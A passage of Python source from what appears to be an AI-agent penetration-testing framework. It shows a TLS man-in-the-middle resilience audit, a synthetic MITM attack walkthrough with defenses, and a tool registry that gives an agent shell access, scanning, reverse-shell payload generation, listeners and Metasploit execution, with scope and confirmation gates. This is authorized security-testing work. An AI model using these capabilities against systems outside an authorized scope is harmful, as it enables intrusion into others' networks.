        findings.append(("high", f"HTTPS handshake failed at {host}:{port}; endpoint unreachable"))
    else:
        for label, flag in _TLS_VERSION_FLAGS:
            vrc, vout = _openssl_sclient(host, port, timeout, [flag])
            if vrc == 0 and "BEGIN CERTIFICATE" in vout:
                supported.append(label)
        legacy = [v for v in supported if v in _LEGACY_TLS]
        if legacy:
            findings.append(("high", "legacy TLS versions accepted: " + ", ".join(sorted(legacy))))
        if negotiated_cipher and any(k in negotiated_cipher.upper() for k in _WEAK_CIPHER_MARKERS):
            findings.append(("high", f"weak cipher negotiated: {negotiated_cipher}"))
        facts = _parse_cert_facts(base_out, timeout)
        if facts["days_left"] is not None:
            if facts["days_left"] < 0:
                findings.append(("high", f"certificate expired {-facts['days_left']} day(s) ago"))
            elif facts["days_left"] <= 30:
                findings.append(("low", f"certificate expires soon ({facts['days_left']} days)"))
        names = facts["san"] + ([facts["cn"]] if facts["cn"] else [])
        if names and not _cert_names_match(host, names):
            findings.append(("high", f"certificate does not cover {host} (SAN/CN: {', '.join(names[:4])})"))
        if facts["subject"] and facts["subject"] == facts["issuer"]:
            findings.append(("mid", "self-signed certificate"))
        if verify and not verify.startswith("0 "):
            findings.append(("high", f"certificate chain not trusted: {verify}"))
        if facts["sig_alg"].lower().startswith(("md5", "sha1")):
            findings.append(("mid", f"weak signature algorithm: {facts['sig_alg']}"))

    if reachable:
        try:
            url = f"https://{host}:{port}/" if port != 443 else f"https://{host}/"
            with _http_client(ctx, min(timeout, 15), True) as cli:
                resp = cli.get(url)
            hsts = resp.headers.get("strict-transport-security", "")
            if not hsts:
                findings.append(("mid", "HSTS header missing — SSL-strip/downgrade exposure"))
            else:
                mm = re.search(r"max-age=(\d+)", hsts, re.IGNORECASE)
                age = int(mm.group(1)) if mm else 0
                if age < 31536000:
                    findings.append(("low", f"HSTS max-age is small ({age}s)"))
        except Exception as exc:  # noqa: BLE001
            findings.append(("info", f"HSTS probe failed: {exc}"))
        if port == 443:
            try:
                with _http_client(ctx, min(timeout, 10), False) as cli:
                    plain = cli.get(f"http://{host}/", timeout=min(timeout, 10))
                if plain.status_code < 400 and len(plain.content) > 0:
                    findings.append(("mid", "plaintext HTTP still serves content on port 80 — downgrade exposure"))
                elif plain.status_code in (301, 302, 307, 308):
                    findings.append(("info", f"HTTP redirects to {plain.headers.get('location', '?')}"))
            except Exception:  # noqa: BLE001
                pass

    highs = [txt for sev, txt in findings if sev == "high"]
    mids = [txt for sev, txt in findings if sev == "mid"]
    lows = [txt for sev, txt in findings if sev == "low"]
    if not reachable:
        rating = "UNKNOWN (endpoint not reachable)"
    elif highs:
        rating = "CRITICAL"
    elif mids:
        rating = "WEAK"
    elif lows:
        rating = "MODERATE"
    else:
        rating = "STRONG"

    lines = [
        f"MITM resilience audit — {host}:{port}",
        f"  endpoint: {'reachable' if reachable else 'unreachable'}",
        f"  negotiated: {negotiated_proto or '-'} / {negotiated_cipher or '-'}",
        f"  verify: {verify or '-'}",
        f"  TLS versions accepted: {', '.join(supported) or '-'}",
    ]
    if facts:
        lines.append(f"  cert: {facts.get('subject') or '-'}")
        lines.append(f"  issuer: {facts.get('issuer') or '-'}")
        if facts.get("days_left") is not None:
            lines.append(f"  expires: {facts.get('not_after')} ({facts['days_left']} days)")
    lines.append("Findings:" if findings else "Findings: none — posture looks solid")
    for sev, txt in findings:
        lines.append(f"  [{sev}] {txt}")
    lines.append(f"Resilience: {rating}")

    recs: list[str] = []
    if any("legacy TLS" in t for _, t in findings):
        recs.append("disable TLSv1.0/1.1; require TLSv1.2+ only")
    if any("weak cipher" in t for _, t in findings):
        recs.append("drop legacy cipher suites (RC4/DES/NULL/EXPORT/MD5)")
    if any("chain not trusted" in t or "expired" in t or "does not cover" in t for _, t in findings):
        recs.append("issue a valid certificate from a trusted CA covering the exact hostname")
    if any("self-signed" in t for _, t in findings):
        recs.append("replace the self-signed certificate with a CA-issued one for production services")
    if any("HSTS" in t for _, t in findings):
        recs.append("enable HSTS (max-age>=31536000, includeSubDomains) and consider preload")
    if any("plaintext HTTP" in t for _, t in findings):
        recs.append("redirect or disable plaintext HTTP; serve HTTPS only")
    if not recs:
        recs.append("maintain current posture; monitor certificate expiry and config drift")
    lines.append("Recommendations:")
    lines += [f"  - {r}" for r in recs]

    for sev, txt in findings:
        ctx.session.setdefault("findings", []).append(
            {"category": "finding", "severity": sev, "host": host,
             "text": f"mitm: {txt}", "ts": _ts()})
    ctx.session["actions"].append({"tool": "mitm_audit", "target": f"{host}:{port}",
                                   "rating": rating, "findings": len(findings), "ts": _ts()})
    return clip("\n".join(lines))


_MITM_DEMO = """\
MITM ATTACK CHAIN — LOCAL SYNTHETIC DEMONSTRATION
(simulation only: synthetic addresses, no network access, no real credentials)
================================================================================
Scenario (synthetic lab): attacker 192.0.2.10 shares a LAN/Wi-Fi segment with
victim 192.0.2.20; the default gateway is 192.0.2.1; the target site is
login.example.test.

Stage 1 — take a position on the path (ARP spoofing):
  The attacker poisons ARP caches on both sides so that victim<->gateway traffic
  is bridged through the attacker's NIC:
      victim believes  gateway 192.0.2.1  is at  aa:bb:cc:00:11:22 (attacker)
      gateway believes victim 192.0.2.20   is at  aa:bb:cc:00:11:22 (attacker)
  Result: the attacker becomes a transparent bridge for the victim's flows.

Stage 2 — redirect name resolution (DNS spoofing, optional):
  Victim asks "where is login.example.test?"; the on-path attacker answers first
  with its own address instead of the real one:
      victim -> attacker : DNS query login.example.test
      victim <- attacker : 192.0.2.10 (forged answer, short TTL)

Stage 3 — downgrade or terminate TLS:
  (a) SSL strip: proxy the HTTPS site to the victim over plaintext HTTP and
      rewrite links on the fly — no certificate warning appears at all.
  (b) Full TLS interception: terminate TLS with a forged certificate for the
      target. The victim sees a trust warning unless an attacker-controlled CA
      certificate was previously installed on the device.

What the victim experiences afterwards: anything submitted on a stripped page
travels through the attacker in cleartext; session cookies ride the intercepted
connection and can be replayed elsewhere (session hijacking).

DETECTION AND DEFENSE
  - HSTS (long max-age, includeSubDomains, preload): browsers refuse the
    downgrade and surface certificate anomalies loudly.
  - Certificate pinning / trust-on-first-use: forged certificates fail in apps.
  - Encrypted DNS (DoH/DoT) and VPN: removes the on-path position and DNS control.
  - Network controls: dynamic ARP inspection (DAI), DHCP snooping, port security,
    802.1X, rogue-AP/WIDS monitoring, client isolation on guest Wi-Fi.
  - Client hygiene: never bypass certificate warnings, keep the trust store clean,
    prefer applications that enforce pinning.

Use the `mitm_audit` tool against an authorized target to measure how well these
defenses are actually deployed (certificate validity, TLS versions, cipher
strength, HSTS, plaintext fallback).
"""


def h_mitm_demo(args: dict, ctx: Ctx) -> str:
    ctx.console.log_action("mitm_demo", "synthetic walkthrough")
    ctx.session["actions"].append({"tool": "mitm_demo", "mode": "synthetic",
                                   "network": "none", "ts": _ts()})
    return clip(_MITM_DEMO, 8000)


# --------------------------------------------------------------------------
# registry
# --------------------------------------------------------------------------

def _schema(name: str, description: str, properties: dict, required: list[str]) -> dict:
    return {
        "type": "function",
        "function": {
            "name": name,
            "description": description,
            "parameters": {"type": "object", "properties": properties, "required": required},
        },
    }


TOOLS: list[dict] = [
    _schema("shell", "Run a shell command on the operator host (cwd = session workdir). "
                     "Use when no dedicated tool fits. Returns stdout+stderr and exit code.",
            {"command": {"type": "string", "description": "shell command to execute"},
             "timeout": {"type": "integer", "description": "seconds before kill (default 90)"}},
            ["command"]),
    _schema("nmap_scan", "Port/service scan with nmap. Profiles: quick (-F), top100, full (-p-), "
                         "service (-sV -sC), vuln (--script=vuln), stealth, udp.",
            {"target": {"type": "string", "description": "host, IP range or CIDR (must be in scope)"},
             "profile": {"type": "string", "description": "quick|top100|full|service|vuln|stealth|udp"},
             "ports": {"type": "string", "description": "explicit port spec, e.g. 80,443 or 1-1000"},
             "extra": {"type": "string", "description": "additional raw nmap flags"},
             "timeout": {"type": "integer"}},
            ["target"]),
    _schema("http_probe", "Fetch a URL and report status, headers, title and size. Non-destructive.",
            {"url": {"type": "string"},
             "method": {"type": "string", "description": "GET, POST, HEAD, PUT, DELETE, OPTIONS"},
             "follow": {"type": "boolean"},
             "timeout": {"type": "number"}},
            ["url"]),
    _schema("web_vuln_scan", "Passive/semi-active web checks: security headers, allowed methods, CORS "
                             "reflection, common sensitive paths, tech fingerprint.",
            {"url": {"type": "string"},
             "checks": {"type": "string", "description": "headers,methods,paths,cors,tech"},
             "timeout": {"type": "number"}},
            ["url"]),
    _schema("dns_recon", "DNS enumeration (A/AAAA/CNAME/MX/NS/TXT/SOA) plus whois if available.",
            {"domain": {"type": "string"},
             "types": {"type": "string", "description": "comma separated record types"}},
            ["domain"]),
    _schema("subdomain_enum", "Enumerate subdomains via crt.sh and HackerTarget.",
            {"domain": {"type": "string"},
             "source": {"type": "string", "description": "crtsh|hackertarget|all"}},
            ["domain"]),
    _schema("cve_lookup", "Look up a CVE by id or search the CVE database by keyword.",
            {"query": {"type": "string"}}, ["query"]),
    _schema("exploit_search", "Search local exploit DB (searchsploit if installed) and CVE references "
                              "for exploit material.",
            {"query": {"type": "string"}}, ["query"]),
    _schema("payload_gen", "Generate a labeled payload for a listener. Types: bash, nc, nc-e, socat, awk, "
                             "python, python-pty, php, powershell, download, download-wget.",
            {"type": {"type": "string"},
             "lhost": {"type": "string"},
             "lport": {"type": "string"},
             "base64": {"type": "boolean"},
             "output": {"type": "string", "description": "optional file path to save the payload"}},
            ["type", "lhost", "lport"]),
    _schema("listener", "Start/stop a local ncat listener for reverse-shell callbacks.",
            {"action": {"type": "string", "description": "start|stop"},
             "lport": {"type": "integer"},
             "proto": {"type": "string", "description": "tcp|exec"}},
            ["action"]),
    _schema("note", "Record an engagement finding, credential, target or todo. Evidence optional.",
            {"text": {"type": "string"},
             "category": {"type": "string", "description": "finding|credential|target|todo"},
             "evidence": {"type": "string"},
             "host": {"type": "string"}},
            ["text"]),
    _schema("scope", "Manage the authorized engagement scope (list|add|remove|check).",
            {"action": {"type": "string"},
             "target": {"type": "string"},
             "note": {"type": "string"}},
            ["action"]),
    _schema("file_write", "Write an artifact (exploit script, wordlist, patch) to disk.",
            {"path": {"type": "string"},
             "content": {"type": "string"}},
            ["path", "content"]),
    _schema("report", "Show or save the engagement report (markdown).",
            {"action": {"type": "string", "description": "show|save|export"},
             "path": {"type": "string"}},
            ["action"]),
    _schema("encode", "Encode or decode data. Codecs: base64, hex, url, rot13, jwt (decode only).",
            {"input": {"type": "string"},
             "op": {"type": "string", "description": "encode|decode"},
             "codec": {"type": "string", "description": "base64|hex|url|rot13|jwt"}},
            ["input"]),
    _schema("hash_info", "Identify a password hash format from its structure (MD5, NTLM, SHA1/256/512, "
                        "bcrypt, Linux crypt, phpass, MySQL).",
            {"hash": {"type": "string"}}, ["hash"]),
    _schema("ip_info", "Look up IP/CIDR ownership, ASN and geolocation (ipinfo.io). Scope-bound.",
            {"target": {"type": "string", "description": "IP, CIDR or host"}}, ["target"]),
    _schema("tls_cert", "Fetch and parse the TLS certificate for host:port with openssl. Scope-bound.",
            {"target": {"type": "string"},
             "port": {"type": "integer"},
             "timeout": {"type": "integer"}},
            ["target"]),
    _schema("web_dirs", "Probe common directories/files (or a supplied wordlist) on a web server. "
                        "Scope-bound, non-destructive.",
            {"url": {"type": "string"},
             "wordlist": {"type": "string", "description": "optional wordlist path"},
             "limit": {"type": "integer", "description": "max paths to probe (default 60)"},
             "timeout": {"type": "number"}},
            ["url"]),
    _schema("dns_snapshot", "Resolve scoped-domain A/AAAA records, persist a local baseline, and report changes.",
            {"domain": {"type": "string", "description": "in-scope domain"}}, ["domain"]),
    _schema("msf_catalog", "Check local Metasploit availability or search its module catalog "
                          "(type selectable; default auxiliary). Search-only — module execution is a "
                          "separate opt-in tool (msf_exec).",
            {"action": {"type": "string", "description": "status|search"},
             "query": {"type": "string", "description": "local catalog search text"},
             "type": {"type": "string", "description": "auxiliary|exploit|post|payload|encoder|nops|all"}},
            ["action"]),
    _schema("mitm_audit", "Read-only MITM-resilience audit of a scoped TLS endpoint: certificate "
                        "validity/hostname/chain, TLS versions and cipher strength, HSTS, plaintext "
                        "fallback. Reports exposure ratings; never intercepts traffic.",
            {"target": {"type": "string", "description": "host or host:port (must be in scope)"},
             "port": {"type": "integer", "description": "default 443"},
             "timeout": {"type": "integer"}},
            ["target"]),
    _schema("mitm_demo", "Local synthetic MITM attack-chain walkthrough with a defensive checklist. "
                        "No network access and no real targets; educational output only.",
            {"topic": {"type": "string", "description": "optional focus label (arp|dns|tls); informational"}},
            []),
    _schema("msf_payload", "Generate a Metasploit payload with msfvenom and save it as a file "
                          "(elf, exe, raw, apk, jar, psh, bash, python, ...). Generation only; sends nothing.",
            {"payload": {"type": "string", "description": "e.g. linux/x64/meterpreter/reverse_tcp"},
             "lhost": {"type": "string"},
             "lport": {"type": "string"},
             "format": {"type": "string", "description": "elf|exe|raw|apk|jar|psh|bash|python|... (default raw)"},
             "options": {"type": "array", "items": {"type": "string"}, "description": "extra KEY=value pairs"},
             "output": {"type": "string", "description": "output file (default output/msf-payload-<lport>.<ext>)"},
             "timeout": {"type": "integer"}},
            ["payload", "lhost", "lport"]),
    _schema("msf_plan", "Write a reviewed Metasploit resource script (.rc) for one module and in-scope "
                        "RHOSTS. Planning only; run it via msf_exec (opt-in) or msfconsole -r.",
            {"module": {"type": "string", "description": "e.g. exploit/multi/handler"},
             "rhosts": {"type": "string", "description": "targets (comma/space separated; must be in scope)"},
             "payload": {"type": "string"},
             "lhost": {"type": "string"},
             "lport": {"type": "string"},
             "options": {"type": "array", "items": {"type": "string"}, "description": "extra KEY=value pairs"},
             "name": {"type": "string", "description": "runbook name (default runbook -> output/msf-runbook.rc)"}},
            ["module", "rhosts"]),
    _schema("msf_exec", "Run a Metasploit resource script via msfconsole. Requires msf_execute to be "
                        "enabled (config.yaml or --msf-exec), in-scope RHOSTS, and an operator "
                        "confirmation unless msf_confirm is disabled. Dry-run previews the command.",
            {"rc": {"type": "string", "description": "path to the .rc resource script"},
             "timeout": {"type": "integer"}},
            ["rc"]),
    _schema("msf_rpc_status", "Check the remote Metasploit RPC connection (msfrpcd) and report its "
                             "version/platform. Needs msfrpcd_host in config.yaml; read-only.",
            {}, []),
    _schema("msf_rpc_console", "Drive a remote MSF console: create|list|read|write|destroy. write "
                               "requires msf_execute, confirms and honours dry-run.",
            {"action": {"type": "string", "description": "create|list|read|write|destroy"},
             "cid": {"type": "string", "description": "console id (from create)"},
             "data": {"type": "string", "description": "command text for write"}},
            ["action"]),
    _schema("msf_rpc_run", "Execute a module on the remote MSF (exploit/auxiliary/post/payload). "
                           "Requires msf_execute; every RHOSTS/RHOST entry must be in scope; "
                           "confirms and honours dry-run.",
            {"type": {"type": "string", "description": "exploit|auxiliary|post|payload"},
             "module": {"type": "string"},
             "options": {"type": "object",
                         "description": "KEY: value pairs incl. RHOSTS/LHOST/LPORT/PAYLOAD"}},
            ["type", "module"]),
    _schema("msf_rpc_session", "List, inspect or stop remote MSF sessions (shell/meterpreter).",
            {"action": {"type": "string", "description": "list|info|stop"},
             "sid": {"type": "string", "description": "session id for info/stop"}},
            ["action"]),
]

HANDLERS = {
    "shell": h_shell,
    "nmap_scan": h_nmap,
    "http_probe": h_http_probe,
    "web_vuln_scan": h_web_vuln_scan,
    "dns_recon": h_dns_recon,
    "subdomain_enum": h_subdomain_enum,
    "cve_lookup": h_cve_lookup,
    "exploit_search": h_exploit_search,
    "payload_gen": h_payload_gen,
    "listener": h_listener,
    "note": h_note,
    "scope": h_scope,
    "file_write": h_file_write,
    "report": h_report,
    "encode": h_encode,
    "hash_info": h_hash_info,
    "ip_info": h_ip_info,
    "tls_cert": h_tls_cert,
    "web_dirs": h_web_dirs,
    "dns_snapshot": h_dns_snapshot,
    "msf_catalog": h_msf_catalog,
    "mitm_audit": h_mitm_audit,
    "mitm_demo": h_mitm_demo,
    "msf_payload": h_msf_payload,
    "msf_plan": h_msf_plan,
    "msf_exec": h_msf_exec,
    "msf_rpc_status": h_msf_rpc_status,
    "msf_rpc_console": h_msf_rpc_console,
    "msf_rpc_run": h_msf_rpc_run,
    "msf_rpc_session": h_msf_rpc_session,
}
